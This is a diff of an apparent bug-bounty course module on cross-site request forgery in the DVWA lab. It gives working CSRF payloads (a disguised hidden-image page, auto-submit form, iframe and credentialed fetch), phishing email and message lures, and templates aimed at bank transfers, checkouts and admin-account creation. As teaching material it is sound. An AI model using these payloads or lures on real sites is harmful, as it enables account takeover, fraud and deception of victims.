 <!DOCTYPE html>
 <html>
-<head>
+  <head>
     <title>Funny Cat Videos</title>
-</head>
-<body>
+  </head>
+  <body>
     <h1>Loading funny cats... 🐱</h1>
 
     <!-- Attack executes immediately on page load -->
-    <img src="http://localhost/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change"
-         style="display:none;"
-         alt="csrf" />
+    <img
+      src="http://localhost/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change"
+      style="display:none;"
+      alt="csrf"
+    />
 
     <script>
-        // Redirect to real content after attack
-        setTimeout(() => {
-            window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-        }, 1000);
+      // Redirect to real content after attack
+      setTimeout(() => {
+        window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+      }, 1000)
     </script>
-</body>
+  </body>
 </html>
 ```
 
 **Step 3: Host the Malicious Page**
 
 **Method 1: Python HTTP Server**
+
 ```bash
 # Create malicious.html file
 nano malicious.html
@@ -2802,6 +3101,7 @@ python3 -m http.server 8080
 ```
 
 **Method 2: Public Hosting**
+
 ```
 1. Upload to: Repl.it, Netlify, GitHub Pages
 2. Get public URL
@@ -2811,6 +3111,7 @@ python3 -m http.server 8080
 **Step 4: Social Engineering Delivery**
 
 **Email Template:**
+
 ```
 Subject: 🎁 You Won! Claim Your iPhone Now!
 
@@ -2829,6 +3130,7 @@ Apple Giveaway Team
 ```
 
 **WhatsApp/SMS:**
+
 ```
 Hey! 😊
 Check out this hilarious video 😂
@@ -2837,6 +3139,7 @@ You won't believe what happens!
 ```
 
 **Social Media:**
+
 ```
 OMG! This is amazing! 🤯
 Everyone needs to see this!
@@ -2846,6 +3149,7 @@ Everyone needs to see this!
 ### Attack Execution
 
 **Victim's Perspective:**
+
 ```
 1. Receives email/message
 2. Currently logged into DVWA (or bank)
@@ -2858,6 +3162,7 @@ Everyone needs to see this!
 ```
 
 **What Actually Happened:**
+
 ```
 1. Page loaded malicious HTML
 2. Hidden image tag executed
@@ -2870,6 +3175,7 @@ Everyone needs to see this!
 ```
 
 **Attacker's Perspective:**
+
 ```
 1. Victim clicked link ✓
 2. Password changed ✓
@@ -2881,6 +3187,7 @@ Everyone needs to see this!
 ### Verification
 
 **Test the Attack:**
+
 ```
 1. Ensure you're logged in as admin
 2. Open malicious page in same browser
@@ -2892,18 +3199,20 @@ Everyone needs to see this!
 ### Attack Variations
 
 **1. Auto-Submit Form**
+
 ```html
 <form id="csrf-form" action="http://localhost/vulnerabilities/csrf/" method="GET">
-    <input type="hidden" name="password_new" value="pwned123" />
-    <input type="hidden" name="password_conf" value="pwned123" />
-    <input type="hidden" name="Change" value="Change" />
+  <input type="hidden" name="password_new" value="pwned123" />
+  <input type="hidden" name="password_conf" value="pwned123" />
+  <input type="hidden" name="Change" value="Change" />
 </form>
 <script>
-    document.getElementById('csrf-form').submit();
+  document.getElementById('csrf-form').submit()
 </script>
 ```
 
 **2. Multiple Targets**
+
 ```html
 <!-- Change password -->
 <img src="http://localhost/csrf/?password_new=hack1&password_conf=hack1&Change=Change" />
@@ -2916,23 +3225,30 @@ Everyone needs to see this!
 ```
 
 **3. Iframe Attack**
+
 ```html
-<iframe src="http://localhost/vulnerabilities/csrf/?password_new=owned&password_conf=owned&Change=Change"
-        style="display:none;">
+<iframe
+  src="http://localhost/vulnerabilities/csrf/?password_new=owned&password_conf=owned&Change=Change"
+  style="display:none;"
+>
 </iframe>
 ```
 
 **4. JavaScript Fetch**
+
 ```javascript
-fetch('http://localhost/vulnerabilities/csrf/?password_new=fetch123&password_conf=fetch123&Change=Change', {
-    credentials: 'include' // Include cookies
-})
-.then(() => console.log('CSRF successful'));
+fetch(
+  'http://localhost/vulnerabilities/csrf/?password_new=fetch123&password_conf=fetch123&Change=Change',
+  {
+    credentials: 'include', // Include cookies
+  },
+).then(() => console.log('CSRF successful'))
 ```
 
 ### Defense Demonstration
 
 **Why Low Security Failed:**
+
 ```php
 // NO validation whatsoever
 if ($_GET['password_new'] == $_GET['password_conf']) {
@@ -2941,6 +3257,7 @@ if ($_GET['password_new'] == $_GET['password_conf']) {
 ```
 
 **What's Missing:**
+
 - ❌ No CSRF token
 - ❌ No origin validation
 - ❌ No referer checking
@@ -2954,6 +3271,7 @@ if ($_GET['password_new'] == $_GET['password_conf']) {
 ### Banking Applications
 
 **Attack:** Transfer funds
+
 ```html
 <img src="https://bank.com/transfer?to=attacker_account&amount=50000" />
 ```
@@ -2963,11 +3281,12 @@ if ($_GET['password_new'] == $_GET['password_conf']) {
 ### E-commerce Sites
 
 **Attack:** Make purchases
+
 ```html
 <form action="https://shop.com/checkout" method="POST">
-    <input type="hidden" name="item" value="expensive_phone" />
-    <input type="hidden" name="quantity" value="10" />
-    <input type="hidden" name="ship_to" value="attacker_address" />
+  <input type="hidden" name="item" value="expensive_phone" />
+  <input type="hidden" name="quantity" value="10" />
+  <input type="hidden" name="ship_to" value="attacker_address" />
 </form>
 ```
 
@@ -2976,6 +3295,7 @@ if ($_GET['password_new'] == $_GET['password_conf']) {
 ### Social Media
 
 **Attack:** Change profile/post content
+
 ```html
 <img src="https://social.com/post?content=spam_message" />
 ```
@@ -2985,6 +3305,7 @@ if ($_GET['password_new'] == $_GET['password_conf']) {
 ### Administrative Panels
 
 **Attack:** Create admin account
+
 ```html
 <img src="https://admin.site.com/users/create?username=hacker&role=admin" />
 ```
@@ -2998,21 +3319,25 @@ if ($_GET['password_new'] == $_GET['password_conf']) {
 **Historical Incidents:**
 
 **1. Netflix (2006)**
+
 - Changed account details via CSRF
 - Could change email and password
 - Complete account takeover
 
 **2. YouTube (2008)**
+
 - Forced users to favorite videos
 - Forced users to subscribe to channels
 - Mass manipulation possible
 
 **3. ING Direct (2007)**
+
 - Transferred money via CSRF
 - No additional authentication
 - Financial losses
 
 **4. McAfee (2010)**
+
 - Changed account settings
 - Disabled antivirus protection
 - Security compromise
@@ -3021,22 +3346,23 @@ if ($_GET['password_new'] == $_GET['password_conf']) {
 
 **Note**: This completes the detailed CSRF module. The next section will demonstrate Medium and High security levels in DVWA, showing how proper protections work.
 
-*Course Status: CSRF Deep Dive Complete*
-*Next: CSRF Defense Mechanisms & Higher Security Levels*
+_Course Status: CSRF Deep Dive Complete_
+_Next: CSRF Defense Mechanisms & Higher Security Levels_
 
-| Vulnerability | Impact | Difficulty | Detection |
-|--------------|--------|------------|-----------|
-| Brute Force | High | Easy | Hard |
-| Command Injection | Critical | Medium | Easy |
-| CSRF | High | Easy | Medium |
-| XSS | High | Medium | Easy |
-| SQL Injection | Critical | Medium | Easy |
+| Vulnerability     | Impact   | Difficulty | Detection |
+| ----------------- | -------- | ---------- | --------- |
+| Brute Force       | High     | Easy       | Hard      |
+| Command Injection | Critical | Medium     | Easy      |
+| CSRF              | High     | Easy       | Medium    |
+| XSS               | High     | Medium     | Easy      |
+| SQL Injection     | Critical | Medium     | Easy      |
 
 ---
 
 ## Key Takeaways - Part 4
 
 ### Command Injection
+
 ✓ Always test multiple operators (|, &&, ;, ||)
 ✓ Try different programming languages
 ✓ Use native binaries to bypass WAF
@@ -3045,6 +3371,7 @@ if ($_GET['password_new'] == $_GET['password_conf']) {
 ✓ Manual exploitation for stable shells
 
 ### CSRF
+
 ✓ Exploits trust browsers have in authenticated users
 ✓ No password needed if user is logged in
 ✓ GET requests more vulnerable than POST
@@ -3053,6 +3380,7 @@ if ($_GET['password_new'] == $_GET['password_conf']) {
 ✓ Can chain with XSS for token theft
 
 ### Testing Methodology
+
 1. **Identify** vulnerable input points
 2. **Test** with basic payloads
 3. **Bypass** security measures
@@ -3064,25 +3392,28 @@ if ($_GET['password_new'] == $_GET['password_conf']) {
 
 **Note**: Continue practicing these vulnerabilities in DVWA before attempting real bug bounty programs. Understanding the fundamentals is crucial for success.
 
-*Course Status: Command Injection & CSRF Complete*
-*Next: SQL Injection, XSS, and File Upload Vulnerabilities*
+_Course Status: Command Injection & CSRF Complete_
+_Next: SQL Injection, XSS, and File Upload Vulnerabilities_
 
 ---
 
 ## Additional Resources
 
 **Setup Guides:**
+
 - Kali Linux installation (see description)
 - DVWA configuration article (see description)
 - Tool installation: GitHub → /releases
 
 **Further Learning:**
+
 - Password cracking video (referenced)
 - Advanced web exploitation
 - API security testing
 - Mobile application testing
 
 **Community:**
+
 - Bug bounty platforms: HackerOne, Bugcrowd, Intigriti
 - Practice more vulnerabilities in DVWA
 - Join bug bounty communities
